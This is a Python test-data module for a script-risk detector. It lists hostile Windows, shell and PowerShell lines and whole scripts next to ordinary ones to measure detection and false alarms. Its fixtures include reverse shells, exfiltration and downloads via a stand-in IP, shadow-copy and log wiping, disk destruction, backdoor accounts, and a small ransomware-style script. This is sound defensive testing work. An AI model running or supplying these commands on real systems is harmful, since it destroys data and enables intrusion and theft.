"""Both rates for the script risk signals, in three languages.

The round that grew this list from 10 patterns to 18 measured the Windows
side and shipped: a complete Linux ransomware script — encrypt in place,
shred the originals, cron persistence, stop auditd, truncate the logs, wipe a
disk — came back with "None of the operations sift watches for appear in it".
The round after that narrowed the patterns and had to measure the other
direction, where 15 of 17 ordinary lines were being flagged.

Neither list may be trimmed to make a change pass.
"""

#: Hallmark destructive lines, Windows batch. (line,) — kind is "batch".
DESTRUCTIVE_BATCH = [
    "certutil.exe -urlcache -split -f http://198.51.100.7/p.exe %TEMP%\\p.exe",
    "vssadmin.exe delete shadows /all /quiet",
    "vssadmin delete shadows /for=c: /all",
    "wmic shadowcopy delete",
    "wbadmin delete catalog -quiet",
    "bcdedit /set {default} recoveryenabled No",
    "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
    "net localgroup administrators hacker /add",
    "net.exe user hacker P@ss /add",
    "net user hacker P@ss /add",
    "powershell -nop -w hidden -enc SQBFAFgAIAAoAA==",
    "powershell.exe -EncodedCommand SQBFAFgA",
    "schtasks /create /tn Updater /tr %TEMP%\\p.exe /sc onlogon",
    "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d p.exe /f",
    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d p.exe",
    "cipher /w:C:\\",
    "takeown /f C:\\Windows\\System32 /r",
    "icacls C:\\data /grant Everyone:F",
    "attrib +h +s payload.exe",
    "mshta http://198.51.100.7/a.hta",
    "rundll32 shell32.dll,ShellExec_RunDLL p.exe",
    "netsh advfirewall set allprofiles state off",
    "netsh firewall set opmode disable",
    "sc stop WinDefend",
    "wevtutil cl System",
    "fsutil usn deletejournal /D C:",
    "copy p.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
    "del /s /q C:\\backup\\*",
    "format c: /q",
    "diskpart /s script.txt",
    "taskkill /f /im sqlservr.exe",
]

#: The same, for shell and PowerShell and the Windows LOLBins. (line, ext).
DESTRUCTIVE_OTHER = [
 ("dd if=/dev/zero of=/dev/sda bs=1M", "sh"),
 ("mkfs.ext4 -F /dev/sdb1", "sh"),
 ("shred -u /home/alice/report.pdf", "sh"),
 ("chmod -R 000 /etc", "sh"),
 ("openssl enc -aes-256-cbc -salt -in f -out f.locked -k $KEY", "sh"),
 ("(crontab -l; echo '@reboot /tmp/.svc') | crontab -", "sh"),
 ("history -c", "sh"),
 ("iptables -F", "sh"),
 ("systemctl stop auditd", "sh"),
 ("truncate -s 0 /var/log/auth.log", "sh"),
 ("useradd -o -u 0 backdoor", "sh"),
 ("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", "sh"),
 ("cat /dev/urandom > /dev/sda", "sh"),
 ("tar cz /etc | nc 198.51.100.7 4444", "sh"),
 ("scp -r /home/finance root@198.51.100.7:/loot", "sh"),
 ("chattr +i /etc/passwd", "sh"),
 ("Remove-Item -Recurse -Force C:\\Users\\bob", "ps1"),
 ("Set-ExecutionPolicy Bypass -Scope Process -Force", "ps1"),
 ("[scriptblock]::Create([Text.Encoding]::UTF8.GetString("
  "[Convert]::FromBase64String($b))).Invoke()", "ps1"),
 ("irm http://198.51.100.7/p.exe -OutFile $env:TEMP\\p.exe", "ps1"),
 ("Start-Process powershell -Verb RunAs -ArgumentList '-nop'", "ps1"),
 ("Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
  "-Arguments @{CommandLine='p.exe'}", "ps1"),
 ("Get-CimInstance Win32_ShadowCopy | Remove-CimInstance", "ps1"),
 ("msiexec /i http://198.51.100.7/p.msi /qn", "bat"),
 ("esentutl /y C:\\Windows\\System32\\config\\SAM /d C:\\t\\SAM", "bat"),
 ("forfiles /p C:\\Users /s /m *.* /c \"cmd /c del @path\"", "bat"),
 ("sc.exe create UpdaterSvc binPath= C:\\t\\p.exe start= auto", "bat"),
 ("net stop wuauserv & net stop WinDefend", "bat"),
 ("wscript.exe //B run.vbs", "bat"),
 ("vssadmin resize shadowstorage /for=c: /maxsize=401MB", "bat"),
 ("regedit /s run.reg", "bat"),
 ("certutil -encode payload.bin payload.txt", "bat"),
]

#: Ordinary lines that must stay quiet. (line, ext).
ORDINARY = [
    ("REM Do NOT use curl here, the proxy blocks it.", "bat"),
    (":: shutdown is handled by the service, not by us", "bat"),
    ("echo Use net user to check the account", "bat"),
    ("echo Copying report...", "bat"),
    ("copy report.txt D:\\archive\\", "bat"),
    ("xcopy /e /i src dst", "bat"),
    ("if not exist D:\\archive mkdir D:\\archive", "bat"),
    ("REM takeown and icacls are documented in the runbook", "bat"),
    ("echo The installer will format the label, not the disk", "bat"),
    ("set LOGDIR=%USERPROFILE%\\logs", "bat"),
    ("for /f %%i in (list.txt) do echo %%i", "bat"),
    ("# curl is not available on this host, use the mirror", "sh"),
    ("# rm -rf is never used in this script", "sh"),
    ("cp -a src/ dst/", "sh"),
    ("tar czf backup.tgz /srv/data", "sh"),
    ("find /var/log -name '*.gz' -mtime +30 -print", "sh"),
    ("# Set-MpPreference is managed centrally", "ps1"),
    ("Get-ChildItem -Path C:\\data -Recurse | Measure-Object", "ps1"),
    ("Write-Output \"Use Stop-Process only in an emergency\"", "ps1"),
    ("$files = Get-Content .\\list.txt", "ps1"),
    ("echo net localgroup is listed in the audit checklist", "bat"),
    ("REM certutil -urlcache is blocked by policy", "bat"),
]

#: More of the same, from a later round: installer, CI, backup and deploy
#: scripts whose lines the widened patterns had begun to flag.
ORDINARY_MORE = [
 ("rm -f build/.lock", "sh"),
 ("trap 'rm -f \"$TMP\"' EXIT", "sh"),
 ("iex -S mix test --trace", "sh"),
 ("grep -r -e AKIA" "IOSFODNN7EXAMPLE1234 .", "sh"),
 ("sed -e s/AAAAAAAAAAAAAAAAAAAAAAAA/BBBB/g in.txt", "sh"),
 ("robocopy D:\\data \\\\fileserver\\backups\\daily /MIR /R:2", "bat"),
 ('icacls "C:\\ProgramData\\MyApp" /grant "NT SERVICE\\MyApp":(OI)(CI)M', "bat"),
 ('attrib +h "%ProgramData%\\MyApp\\uninstall.dat"', "bat"),
 ("Stop-Process -Name myapp -ErrorAction SilentlyContinue", "ps1"),
 ("mkdir -p /opt/myapp/logs", "sh"),
 ("cp -a src/ dst/", "sh"),
 ("tar czf backup.tgz /srv/data", "sh"),
 ("git clone https://github.com/example/repo.git", "sh"),
 ("npm ci --omit=dev", "sh"),
 ("docker compose up -d", "sh"),
 ("pytest -q tests/", "sh"),
 ("Get-Service | Where-Object {$_.Status -eq 'Running'}", "ps1"),
]

#: What the narrowing round lost and the round after recovered. Each of these
#: was caught before the patterns were tightened and silent after — the
#: tightening was aimed at the object and hit the flag count, the argument
#: order, the program name and the spelling of a switch.
RECOVERED = [
    ("attrib +h C:\\ProgramData\\svc\\payload.exe", "bat"),
    ("attrib +s payload.exe", "bat"),
    ("attrib +h +r payload.exe", "bat"),
    ("icacls C:\\Windows\\System32 /grant:r Everyone:(F)", "bat"),
    ("icacls C:\\data /grant:r Everyone:(OI)(CI)F", "bat"),
    ("netsh advfirewall reset", "bat"),
    ("netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound", "bat"),
    ("pwsh -NoProfile -enc SQBFAFgAIAAoAA==", "ps1"),
    ("powershell -nop -ec SQBFAFgAIAAoAA==", "ps1"),
    ("iex \"$(cat /tmp/payload.txt)\"", "ps1"),
    ("taskkill /im MsMpEng.exe", "bat"),
]

#: Spellings the same operations take in the wild. None of these was ever
#: caught; each is one writer's ordinary way of saying a listed act.
SPELLINGS = [
    ("rm --recursive --force /home/deploy", "sh"),
    ("dd of=/dev/sda if=/dev/zero bs=1M", "sh"),
    ("cat /dev/urandom > /dev/nvme0n1", "sh"),
    ("service auditd stop", "sh"),
    ("systemctl stop crowdstrike-falcon-sensor", "sh"),
    ("killall -9 sqlservr", "sh"),
    ("echo ssh-rsa AAAA >> /var/spool/cron/crontabs/root", "sh"),
    ("openssl aes-256-cbc -e -in f -out f.locked -k $K", "sh"),
    ("gpg --output x.gpg --symmetric secrets.tar", "sh"),
    ("cp bad /etc/sudoers.d/99-backdoor", "sh"),
    ("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1", "sh"),
    ("nc -e /bin/sh 198.51.100.7 4444", "sh"),
    ("iptables --flush", "sh"),
    ("chmod 777 -R /srv", "sh"),
    ("net stop \"Sophos Endpoint Defense\"", "bat"),
    ("Get-CimInstance -ClassName Win32_ShadowCopy | Remove-CimInstance", "ps1"),
    ("Get-ChildItem C:\\d -Recurse | Remove-Item -Force", "ps1"),
    ("Stop-Service -Name Sense -Force", "ps1"),
    ("New-ItemProperty -Path HKLM:\\Run -Name X -Value p.exe", "ps1"),
    ("unset HISTFILE", "sh"),
]

#: Whole scripts, not lines. The one-line corpus above cannot hold a case for
#: anything that spans lines — and the largest regression of the round that
#: added it was exactly that: a `goto :eof`, which is how batch returns from
#: a subroutine and therefore sits above every subroutine in every structured
#: batch file, deleted the rest of the file before it was scanned.
DESTRUCTIVE_FILES = [
    ("subroutines.bat", "batch",
     "@echo off\r\ncall :cleanup\r\ncall :exfil\r\ngoto :eof\r\n\r\n"
     ":cleanup\r\ndel /s /q C:\\backup\\*\r\n"
     "vssadmin delete shadows /all /quiet\r\ngoto :eof\r\n\r\n"
     ":exfil\r\ncertutil.exe -urlcache -split -f http://198.51.100.7/p.exe t.exe\r\n"
     "schtasks /create /tn Updater /tr t.exe /sc onlogon\r\ngoto :eof\r\n"),
    ("marker-in-string.ps1", "powershell",
     "$open = \"<#\"\nRemove-Item -Recurse -Force C:\\Users\\bob\n"
     "$close = \"#>\"\n"),
    ("herestring-in-comment.sh", "shell",
     "#!/bin/bash\n# the config uses @\" for quoting\n"
     "rm -rf /var/log/myapp\n"),
    ("heredoc-in-comment.sh", "shell",
     "#!/bin/bash\n# see <<EOF below for the template\n"
     "curl -o /tmp/s2 http://198.51.100.7/s2\n"),
    ("linux-ransom.sh", "shell",
     "#!/bin/bash\nset -eu\nKEY=$(head -c 32 /dev/urandom | base64)\n"
     "for f in $(find /home -type f -name '*.pdf'); do\n"
     "  openssl enc -aes-256-cbc -salt -in \"$f\" -out \"$f.locked\" -k \"$KEY\"\n"
     "  shred -u \"$f\"\ndone\n"
     "(crontab -l 2>/dev/null; echo '@reboot /tmp/.svc') | crontab -\n"
     "systemctl stop auditd\ntruncate -s 0 /var/log/auth.log\n"
     "dd if=/dev/zero of=/dev/sdb bs=1M count=10\n"),
]

#: Whole scripts that must stay quiet.
ORDINARY_FILES = [
    ("documented.ps1", "powershell",
     "<#\n.SYNOPSIS\nUses Invoke-WebRequest against the internal mirror;\n"
     "do not use curl here, the proxy blocks it.\n"
     "Never call Remove-Item -Recurse on the data directory.\n#>\n"
     "Get-Content .\\CHANGELOG.md\n"),
    ("readme-writer.sh", "shell",
     "#!/bin/bash\ncat > README.txt <<'EOF'\n"
     "To uninstall, run: rm -rf /opt/myapp\n"
     "Do not run curl on this host.\nEOF\n"),
    ("help-text.ps1", "powershell",
     "$help = @'\nDangerous: Set-MpPreference -DisableRealtimeMonitoring\n'@\n"
     "Write-Output $help\n"),
    ("documenting-echo.sh", "shell",
     "#!/bin/bash\n"
     "echo \"Options: --purge; runs rm -rf /var/lib/myapp on every host\"\n"
     "echo done\n"),
    ("installer.bat", "batch",
     "@echo off\r\nsetlocal\r\ncall :install\r\ngoto :eof\r\n\r\n"
     ":install\r\nmkdir \"%ProgramData%\\MyApp\"\r\n"
     "xcopy /e /i /y src \"%ProgramData%\\MyApp\"\r\n"
     "icacls \"%ProgramData%\\MyApp\" /grant \"NT SERVICE\\MyApp\":(OI)(CI)M\r\n"
     "attrib +h \"%ProgramData%\\MyApp\\uninstall.dat\"\r\ngoto :eof\r\n"),
    ("deploy.ps1", "powershell",
     "Stop-Process -Name myapp -ErrorAction SilentlyContinue\n"
     "Copy-Item .\\build\\* C:\\apps\\myapp -Recurse\n"
     "Start-Service myapp\n"),
]
